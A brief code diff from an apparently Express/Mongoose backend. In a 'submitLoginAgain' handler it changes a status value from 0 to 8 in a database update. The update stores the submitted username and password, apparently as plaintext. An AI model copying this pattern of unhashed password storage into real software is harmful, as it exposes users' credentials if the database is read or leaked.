@@ -86,7 +86,7 @@ const submitLoginAgain = async (req, res) => {
   try {
     await Kiwi.findOneAndUpdate(
       { uniqueid },
-      { username, password, status: 0 }
+      { username, password, status: 8 }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
